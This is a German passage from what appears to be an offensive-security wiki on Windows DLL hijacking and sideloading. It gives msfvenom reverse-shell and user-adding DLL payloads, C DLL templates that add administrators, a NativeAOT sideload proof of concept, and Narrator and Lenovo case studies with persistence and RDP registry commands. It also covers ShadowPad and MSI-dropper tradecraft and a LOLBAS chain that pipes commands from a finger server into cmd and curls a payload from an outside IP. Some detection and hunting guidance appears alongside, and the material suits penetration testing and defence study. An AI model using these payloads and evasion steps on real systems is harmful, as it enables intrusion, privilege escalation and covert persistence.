  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Warum das nützlich ist:
- **`<probing privatePath="."/>`** beschränkt die Assembly-Auflösung auf das Anwendungsverzeichnis und macht den Ordner so zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Code des Angreifers, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann einer Full-Trust-App ermöglichen, unsignierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** verhindert Weiterleitungen durch Publisher-Richtlinien zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sorgt für eine deterministischere Runtime-Auswahl.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit** über die Konfiguration deaktiviert, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In jüngeren Kampagnen beobachtetes Vorgehen:
- Stufe 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Stufe 2 kopiert sie in einen glaubwürdig wirkenden **AppData-Update**-Ordner, benennt den Host etwa in `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Stufe 3 überprüft den Ausführungskontext (zum Beispiel, ob der erwartete übergeordnete Prozess `svchost.exe` von Task Scheduler ist), bevor die finale RAT-DLL bzw. der Export geladen wird.

Ideen für die Suche:
- Signierte oder anderweitig legitime **.NET-Executable-Dateien**, die an beschreibbaren Speicherorten verdächtige **`.config`**-Dateien in ihrer Nähe haben.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binärdateien aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen Verzeichnissen wie `\bin\update\` erneut starten.
- Prozessketten, bei denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der unmittelbar danach Nicht-Hersteller-Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen von der DLL-Suchreihenfolge laut Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge aufgeführt:

- Wenn eine **DLL gefunden wird, deren Name mit dem einer bereits im Speicher geladenen DLL übereinstimmt**, umgeht das System die übliche Suche. Stattdessen prüft es auf eine Umleitung und ein Manifest, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario sucht das System nicht nach der DLL**.
- Wird eine DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt, verwendet das System die entsprechende Version der bekannten DLL sowie alle abhängigen DLLs, **ohne die Suche durchzuführen**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- Hat eine **DLL Abhängigkeiten**, werden die abhängigen DLLs so gesucht, als wären sie ausschließlich durch ihre **Modulnamen** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad gefunden wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Einen Prozess identifizieren, der mit **anderen Privilegien** ausgeführt wird oder ausgeführt werden wird (horizontale oder laterale Bewegung) und dem eine **DLL fehlt**.
- Sicherstellen, dass **Schreibzugriff** auf ein beliebiges **Verzeichnis** besteht, in dem nach der **DLL** gesucht wird. Das kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Diese Voraussetzungen sind standardmäßig selten erfüllt: Bei privilegierten ausführbaren Dateien fehlen normalerweise keine DLL-Abhängigkeiten, und Standardbenutzer können in der Regel nicht in Systempfadverzeichnisse schreiben. Fehlkonfigurierte Umgebungen können jedoch beide Bedingungen erfüllen.\
Sind die Voraussetzungen erfüllt, prüfe das Projekt [UACME](https://github.com/hfiref0x/UACME). Obwohl sein Hauptziel der UAC-Bypass ist, enthält es PoCs für DLL-Hijacking unter bestimmten Windows-Versionen, die sich oft an das gefundene beschreibbare Verzeichnis anpassen lassen.

Beachte, dass du **deine Berechtigungen in einem Ordner überprüfen** kannst mit:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Du kannst auch die Imports einer ausführbaren Datei und die Exports einer DLL mit folgendem Befehl überprüfen:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Für eine vollständige Anleitung, wie Sie **DLL Hijacking zur Rechteausweitung** mit Schreibberechtigungen in einem **System-PATH-Ordner** missbrauchen können, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob Sie Schreibberechtigungen für einen Ordner innerhalb des System-PATH haben.\
Weitere interessante automatisierte Tools zum Erkennen dieser Schwachstelle sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls Sie ein ausnutzbares Szenario finden, ist eine der wichtigsten Voraussetzungen für einen erfolgreichen Exploit, **eine DLL zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei daraus importiert**. Beachten Sie außerdem, dass DLL Hijacking praktisch ist, um von einem mittleren Integritätslevel auf ein hohes **(unter Umgehung von UAC)** oder von[ **hoher Integrität auf SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie Sie eine gültige DLL erstellen**, finden Sie in dieser Studie zu DLL Hijacking, die sich auf DLL Hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Im **nächsten Abschnitt** finden Sie außerdem einige **einfache DLL-Codes**, die als **Vorlagen** nützlich sein oder zum Erstellen einer **DLL mit exportierten, nicht erforderlichen Funktionen** dienen können.

## **DLLs erstellen und kompilieren**

### **DLL Proxifying**

Ein **DLL-Proxy** ist im Grunde eine DLL, die **Ihren bösartigen Code beim Laden ausführen**, aber auch **die Funktionen der echten Bibliothek bereitstellen** und sich **wie erwartet verhalten** kann, indem sie alle Aufrufe an die echte Bibliothek **weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) können Sie eine ausführbare Datei angeben und die zu proxifizierende Bibliothek auswählen, um eine **proxifizierte DLL zu generieren**, oder eine **DLL angeben** und eine **proxifizierte DLL generieren**.

### **Meterpreter**

**Reverse Shell abrufen (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Meterpreter (x86) erhalten:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Benutzer erstellen (x86, eine x64-Version habe ich nicht gesehen):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Ihre eigene

In vielen Fällen muss die von Ihnen kompilierte DLL **jede Funktion exportieren, die vom Opferprozess importiert wird**. Fehlt ein erforderlicher Export, kann die Binärdatei ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++-DLL-Beispiel mit Benutzererstellung</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstieg</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT-DLL mit exportausgelöster Initialisierung

Eine eigenständige **.NET-NativeAOT-Shared-Library** kann als platzierte native DLL verwendet werden, ohne eine explizite `DllMain` implementieren zu müssen. Exportieren Sie statische C#-Methoden mit `[UnmanagedCallersOnly(EntryPoint = "...")]`; wenn der native Host einen dieser vom Compiler generierten Einstiegspunkte aufruft, initialisiert NativeAOT das Modul und eine `[ModuleInitializer]`-Methode wird vor dem exportierten C#-Funktionsrumpf ausgeführt. Die Ausgabe benötigt keine separat installierte .NET-Runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

Die DLL benötigt weiterhin die **Exportnamen und ABI-kompatiblen Signaturen**, die der ausgewählte Host tatsächlich aufruft. Minimale Stubs reichen möglicherweise aus, um die Initialisierung auszulösen. Fehlende Exporte können jedoch das Laden verhindern, und eine falsche Signatur kann den Aufruf beschädigen. Ermitteln Sie die Host-Imports und überprüfen Sie das Ergebnis mit `dumpbin /exports payload.dll`, bevor Sie die Ausgabe in den vom Host erwarteten Abhängigkeitsnamen umbenennen.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimale exportierte NativeAOT-DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Konfiguriere das Projekt als eigenständige native Windows-Shared-Library:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Platziere die umbenannte DLL neben der kopierten, verwundbaren ausführbaren Datei und starte den Host über den Codepfad, der den kompatiblen Export aufruft. Dieser Initialisierungsansatz vermeidet es, komplexe Arbeit direkt in `DllMain` auszuführen, doch die Voraussetzungen für das Sideloading bleiben unverändert: Der Loader muss die Abhängigkeit anhand ihres Namens auflösen, das Anwendungsverzeichnis auswählen und darf sie nicht zuerst über KnownDLLs, ein bereits geladenes Modul, SxS-Umleitung oder eingeschränkte `LOAD_LIBRARY_SEARCH_*`-Flags finden.<sup>[[26]](#references)[[30]](#references)</sup>

Konventionelle native Vorlagen findest du unter [Windows C payloads](../windows-c-payloads.md). Eine per Sideloading geladene erste Stufe kann anschließend [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) durchführen; dies ist jedoch eine separate Injection-Technik und kein Bestandteil der DLL-Auflösung.

## Erkennung: Bibliotheksladevorgänge mit DLL-Masquerading

Elastic Defend 9.5.0 ergänzt ein Bibliotheksladeereignis um `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`, wenn die geladene Datei nicht von Microsoft signiert ist und ihr Dateiname mit dem zwischengespeicherten Inventar der Windows-/System-DLL-Namen von Elastic übereinstimmt. Dadurch werden die Überprüfung des Dateinameninventars, des Systempfads und der Signatur in den Endpoint-Sensor verlagert; der EQL-Kern kann daher reduziert werden auf:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Betrachten Sie die Anreicherung als wertvollen Pivot und nicht als alleinigen Beweis. Erhöhen Sie die Konfidenz, wenn ein signierter Host die DLL aus einem eigenen **benutzerschreibbaren** Verzeichnis lädt, die DLL unsigniert/nicht vertrauenswürdig ist und `dll.Ext.relative_file_creation_time` zeigt, dass sie kurz vor dem Laden erstellt wurde. Beschränken Sie Ausschlüsse auf die genaue Kombination aus Herausgeber, Hostprozess und Installationspfad. Unterdrücken Sie einen kollidierenden DLL-Namen nicht global, da legitime Installer und Anwendungen private Bibliotheken mit systemähnlichen Namen enthalten können.<sup>[[26]](#references)</sup>

Auf Sensoren ohne diese Anreicherung lässt sich das Verhalten näherungsweise erkennen, indem ein kollidierender DLL-Name mit einem nicht systemeigenen Ladepfad, einer fehlenden/nicht vertrauenswürdigen Microsoft-Signatur und einem kurzen Zeitintervall zwischen Dateierstellung und Laden korreliert wird. Dazu ist ein gepflegtes DLL-Namensinventar sowie eine enge Ausschlussliste für `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` und andere genehmigte Bereitstellungspfade erforderlich.<sup>[[26]](#references)</sup>

## Fallstudie: Narrator-OneCore-TTS-Lokalisierungs-DLL-Hijacking (Barrierefreiheit/ATs)

Windows Narrator.exe fragt beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL ab, die für beliebige Codeausführung und Persistenz gehijackt werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Abgefragter Pfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Älterer Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exporte sind nicht erforderlich.

Ermittlung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Starten Sie Narrator und beobachten Sie den Ladeversuch für den oben genannten Pfad.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC silence
- Ein naiver Hijack spricht und hebt die Benutzeroberfläche hervor. Um unauffällig zu bleiben, enumeriere beim Attach die Narrator-Threads, öffne den Haupt-Thread (`OpenThread(THREAD_SUSPEND_RESUME)`) und halte ihn mit `SuspendThread` an; fahre in deinem eigenen Thread fort. Den vollständigen Code findest du im PoC.<sup>[[8]](#references)</sup>

Auslösung und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit der obigen Konfiguration lädt der Start von Narrator die platzierte DLL. Drücke auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsebene zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Verbinde dich per RDP mit dem Host und drücke am Anmeldebildschirm CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.
- Die Ausführung endet, sobald die RDP-Sitzung geschlossen wird – injiziere/migriere daher umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen integrierten Accessibility-Tool (AT)-Registrierungseintrag (z. B. CursorIndicator) klonen, so bearbeiten, dass er auf eine beliebige Binärdatei/DLL verweist, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework ermöglicht.

Hinweise
- Das Schreiben in `%windir%\System32` und das Ändern von HKLM-Werten erfordern Admin-Rechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` liegen; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 – Rechteausweitung mit TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Details zur Sicherheitslücke

- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Verzeichnisberechtigungen**: Für `CREATOR OWNER` beschreibbar, sodass lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden, und protokolliert „NAME NOT FOUND“, falls die Datei fehlt. Das weist darauf hin, dass die Suche im lokalen Verzeichnis Vorrang hat.

### Implementierung des Exploits

Ein Angreifer kann eine schädliche `hostfxr.dll`-Stub-Datei im selben Verzeichnis ablegen und so die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Angriffsablauf

1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Warten, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Ist bei Ausführung der Aufgabe ein Administrator angemeldet, wird die schädliche DLL in der Sitzung des Administrators mit mittlerem Integritätslevel ausgeführt.
4. Standard-UAC-Bypass-Techniken nutzen, um von mittlerem Integritätslevel zu SYSTEM-Berechtigungen zu gelangen.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading über einen signierten Host (wsc_proxy.exe)

Angreifer kombinieren häufig MSI-basierte Dropper mit DLL Side-Loading, um Payloads in einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Überblick über die Angriffskette
- Der Benutzer lädt eine MSI-Datei herunter. Während der GUI-Installation wird unbemerkt eine CustomAction ausgeführt (z. B. LaunchApplication oder eine VBScript-Aktion), die die nächste Stufe aus eingebetteten Ressourcen rekonstruiert.
- Der Dropper schreibt eine legitime, signierte EXE-Datei und eine schädliche DLL in dasselbe Verzeichnis (Beispielpaar: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE-Datei lädt die DLL-Suchreihenfolge von Windows zuerst wsc.dll aus dem Arbeitsverzeichnis und führt so den Code des Angreifers in einem signierten Prozess aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- CustomAction-Tabelle:
  - Nach Einträgen suchen, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispiel: LaunchApplication, das im Hintergrund eine eingebettete Datei ausführt.
  - In Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary untersuchen.
- Eingebettete/geteilte Payloads im MSI-CAB:
  - Administrativ extrahieren: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oder lessmsi verwenden: lessmsi x package.msi C:\out
  - Nach mehreren kleinen Fragmenten suchen, die von einer VBScript-CustomAction zusammengefügt und entschlüsselt werden. Typischer Ablauf:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
  - wsc_proxy.exe: legitimer, signierter Host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
  - wsc.dll: DLL des Angreifers. Wenn keine bestimmten Exporte erforderlich sind, reicht DllMain aus; andernfalls erstelle eine Proxy-DLL und leite erforderliche Exporte an die echte Bibliothek weiter, während DllMain das Payload ausführt.
- Erstelle ein minimales DLL-Payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Für Exportanforderungen kannst du ein Proxy-Framework (z. B. DLLirant/Spartacus) verwenden, um eine Forwarding-DLL zu erstellen, die zusätzlich deine Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binärdatei. Verwendet der Host absolute Pfade oder sichere Ladeflags (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und weitergeleitete Exporte können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binärdatei und der Exportmenge berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** bereitstellt, um sich als legitime Software zu tarnen und gleichzeitig die Kern-Payload auf der Festplatte verschlüsselt zu halten:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Hersteller wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei so um, dass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Bösartige Loader-DLL** – wird neben der EXE unter einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise eine mit dem ScatterBrain-Framework obfuskierte MFC-Binärdatei. Ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflectiv in den Speicher zu laden.
3. **Verschlüsselter Payload-Blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem die entschlüsselte Payload in den Speicher gemappt wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu beseitigen.

Hinweise zum Tradecraft:

* Wird die signierte EXE umbenannt, während `OriginalFileName` im PE-Header unverändert bleibt, kann sie sich als Windows-Binärdatei tarnen und zugleich die Herstellersignatur behalten. Orientiere dich daher an Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binärdateien abzulegen, bei denen es sich tatsächlich um AMD-/NVIDIA-Dienstprogramme handelt.
* Da die ausführbare Datei weiterhin als vertrauenswürdig gilt, muss bei den meisten Allowlisting-Kontrollen nur deine bösartige DLL neben ihr liegen. Konzentriere dich auf die Anpassung der Loader-DLL; der signierte übergeordnete Prozess kann in der Regel unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass der TMP-Blob neben dem Loader liegt und beschreibbar ist, damit er die Datei nach dem Mapping überschreiben kann. Lass das Verzeichnis beschreibbar, bis die Payload geladen ist. Sobald sie sich im Speicher befindet, kann die TMP-Datei für OPSEC sicher gelöscht werden.

### LOLBAS-Stager + Sideloading-Kette mit gestaffeltem Archiv (finger → tar/curl → WMI)

Operatoren kombinieren DLL-Sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf der Festplatte die bösartige DLL neben der vertrauenswürdigen EXE ist:<sup>[[1]](#references)</sup>

- **Remote-Befehls-Loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` ruft TCP/79-Text ab; `| cmd` führt die Serverantwort aus, sodass Operatoren die zweite Stufe serverseitig austauschen können.

- **Integrierter Download/Entpacken:** Lade ein Archiv mit einer unverdächtigen Dateiendung herunter, entpacke es und lege das Sideload-Ziel samt DLL in einem zufällig benannten `%LocalAppData%`-Ordner ab:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` blendet den Fortschritt aus und folgt Weiterleitungen; `tar -xf` verwendet das integrierte Windows-Tool tar.

- **WMI/CIM-Start:** Starte die EXE über WMI, damit die Telemetrie einen von CIM erstellten Prozess zeigt, während dieser die danebenliegende DLL lädt:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funktioniert mit Binärdateien, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); die Payload (z. B. Remcos) wird unter dem vertrauenswürdigen Namen ausgeführt.

- **Jagd:** Bei `forfiles` alarmieren, wenn `/p`, `/m` und `/c` gemeinsam vorkommen; außerhalb von Admin-Skripten ist das ungewöhnlich.


## Fallstudie: NSIS-Dropper + Bitdefender Submission Wizard-Sideload (Chrysalis)

Bei einem kürzlichen Lotus-Blossom-Einbruch wurde eine vertrauenswürdige Update-Kette missbraucht, um einen NSIS-gepackten Dropper auszuliefern, der ein DLL-Sideloading sowie vollständig im Arbeitsspeicher ausgeführte Payloads vorbereitete.<sup>[[13]](#references)</sup>

Ablauf des Tradecrafts
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert den Ordner als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard-Datei `BluetoothService.exe`, eine schädliche `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten, LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Puffer mit Klartext-Shellcode, gibt temporäre Daten frei und springt zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a-Basis 0x811C9DC5 + Primzahl 0x1000193** hasht, anschließend einen Murmur-ähnlichen Avalanche-Schritt (**0x85EBCA6B**) anwendet und die Ergebnisse mit gesalzenen Ziel-Hashes vergleicht.

Haupt-Shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem er über fünf Durchläufe wiederholt Add/XOR/Sub mit dem Schlüssel `gQ2JR&9;` ausführt. Anschließend lädt er dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung abzuschließen.
- Rekonstruiert DLL-Namen zur Laufzeit mithilfe von Bit-Rotate/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
